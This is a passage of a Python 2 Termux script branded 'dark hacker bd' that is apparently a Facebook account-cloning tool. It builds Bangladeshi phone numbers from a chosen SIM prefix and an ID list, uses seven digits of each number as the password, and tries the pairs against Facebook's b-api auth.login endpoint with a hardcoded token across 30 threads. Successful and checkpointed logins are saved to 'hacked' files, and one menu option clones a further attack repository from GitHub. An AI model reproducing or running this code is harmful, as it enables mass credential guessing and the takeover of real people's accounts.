            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m016'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '4':
        os.system('clear')
        print """/\033[1;94m
    ),\         dark boy                                          /,(
   /__'.                                                      .'/__
    `)   `'-. \                                          / .-'`   ('
    /   _.--'\ '.          ,               ,          .' /'--._     |
    \         _.`'-.,_'-.\033[1;31m|/\ \    _,_    / /\|\033[1;95m.-'_,.-'`._         /
     `\    .-'       /'-.\033[1;31m|| \ |.-"   "-.| / ||\033[1;96m.-'\       '-.    /`
       )-'`        .'   :\033[1;31m||  / -.\ //.- \  ||\033[1;96m:   '.        `'-(
      /          .'    / \033[1;31m\_ |  /\033[1;95m●\033[1;31m`^'\033[1;95m●\033[1;31m\  | _/\033[1;96m/ \    '.        )
       `)  _.'     .'    .--.; \033[1;31m|\__"__/|\033[1;96m ;.--.    '.     '._  ('
       /_.'     .-'  _.-'     \033[1;31m\ \/^\/ //\033[1;96m     `-._  '-.     '.
        '-._' /`            _   \033[1;31m\-.-//\033[1;96m   _            `\ '_.-'
            `<     _,..--''`|    \033[1;31m\`"`/\033[1;96m    |`''--..,_     >`
             _\  ``--..__   \     \033[1;31m`'`\033[1;96m     /   __..--``  /_
            /  '-.__     ``'-;    / \    ;-'``     __.-'
            '-._    '-._  /    |---|---|    \  _.-'    _.-'
                 `'-._   '/ / / /---|---\ \ \ '   _.-'` 
                         `)` `  /'---'\  ` `(`               
                  /_____/|  / \._\   /_./ \  |\_____              \033[1;31m\033[1;32m                                                 
            █▀▀▀░░░░░░░▀▀▀█                █▀▀▀░░░░░░░▀▀▀█
         █▀░░░░░░░░░░░░░░░░░▀█          █▀░░░░░░░░░░░░░░░░░▀█
        █│░░░░░░░░░░░░░░░░░░░│█        █│░░░░░░░░░░░░░░░░░░░│█
        ▌│░░░░░░░░░░░░░░░░░░░│▐        ▌│░░░░░░░░░░░░░░░░░░░│▐
       █░└┐░░░░░░░░░░░░░░░░░┌┘░█      █░└┐░░░░░░░░░░░░░░░░░┌┘░¶
       █░░└┐░░░░░░░░░░░░░░░┌┘░░█      p█░░└┐░░░░░░░░░░░░░░░┌┘░░█
       █░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░█      █░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░█
        ▌░│██████▌░░░▐██████│░▐█      █▌░│██████▌░░░▐██████│░▐
        █░│▐███▀▀░░▄░░▀▀███▌│░█        █░│▐███▀▀░░▄░░▀▀███▌│░█
       █▀─┘░░░░░░░▐█▌░░░░░░░└─▀█      █▀─┘░░░░░░░▐█▌░░░░░░░└─▀█
       █▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄       █▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄█
         █▄─┘██▌░░░░░░░▐██└─▄█          █▄─┘██▌░░░░░░░▐██└─▄█
          █░░▐█─┬┬┬┬┬┬┬─█▌░░█            █░░▐█─┬┬┬┬┬┬┬─█▌░░█
         █▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐█          █▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐
          █▄░░░└┴┴┴┴┴┴┴┘░░░▄█            █▄░░░└┴┴┴┴┴┴┴┘░░░▄█
            █▄░░░░░░░░░░░▄█               █▄░░░░░░░░░░░▄█
               █▄▄▄▄▄▄▄█                      █▄▄▄▄▄▄▄█
         \033[1;33m                 dark hacker bd
            
         \033[1;33mDEVLOPER\033[1;37m :\033[1;96m dark boy \033[1;37m(\033[1;31msorif\033[1;37m)
"""
        os.system("pkg update -y")
        os.system("pkg install -y git")
        os.system("clear")
        os.system("cd /data/data/com.termux/files/home")
        os.system("ls")
        os.system("cd /data/data/com.termux/files/home")
        os.system("rm -rf dark-clone1")
        os.system("git clone https://github.com/dark-hacker-bd/dark-clone1")
        os.system("cd dark-clone1")
        os.system("")
     
        
    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m015'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m013'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m014'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '3':
    	print logo
        os.system('xdg-open https://www.facebook.com/profile.php?id=100029061534369 ')
        time.sleep(1)
        menu()
    elif bch == '2':
    	print logo
        os.system('xdg-open https://facebook.com/groups/426240602403850/')
        time.sleep(1)
        menu()
    elif bch == '0':
    	os.system('clear')
    	print logo
    	print'\033[1;33mtnxx amar tool use korar jonno ..plzzz sobay grupe a membar invite koren'
        exb()
    else:
        print '[!] Fill in correctly'
        os.system('clear')
        action()
        os.system('clear')
    
    xxx = str(len(id))
    
    
    psb("""
                      Total id Numbers\033[1;32m: """ + xxx)
    time.sleep(0.5)
    psb('      \033[1;37m        Please wait, dark proggram is running ...')
    time.sleep(0.5)
    psb('\x1b[1;96m')
    time.sleep(0.5)
    print """\x1b[1;95m        ●════════════════════════◄►════════════════════════●
\x1b[1;95m        ●════════════════════════◄►════════════════════════●
"""

    def main(arg):
        user = arg
        try:
            os.mkdir('hacked by dark boy')
        except OSError:
            pass

        try:
            result = k + c + user
            digi7 = result[7:14]
            pass1 = digi7
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\033[1;76m          [hacked by dark boy]\x1b[0m ' + k + c + user + ' }{ ' + pass1 + '}\n' + '\n'
                okb = open('hacked by dark boy/hacked 100%successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\033[1;33m 《\033[1;96m cp-\033[1;31mdark\033[1;33m}  \033[1;33m{\033[1;95m ' + pass1 + '\033[1;33m  }\033[1;96m{ \033[1;34m ' + k + c + user + '\033[1;96m }\x1b[1;96m =\033[1;33m{\033[1;95mOpen After \033[1;33m9 \033[1;96mDays\033[1;33m 》\n'
                cps = open('hacked by dark boy/hacked 50%checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    

if __name__ == '__main__':
    menu()

